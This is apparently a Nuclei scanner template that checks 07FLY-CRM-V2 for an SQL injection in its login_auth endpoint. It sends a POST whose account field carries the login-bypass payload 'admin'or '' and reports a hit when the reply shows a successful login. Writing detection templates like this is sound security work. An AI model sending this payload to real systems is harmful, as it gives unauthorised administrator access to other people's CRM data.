id: 07fly-crm-v2-sqli
info:
  name: "07FLY-CRM-V2 login_auth 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 07FLY-CRM-V2

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php/sysmanage/Login/login_auth/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "account=admin'or ' &password=1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"statusCode":"200","message":"'
          - '"callbackType":"'
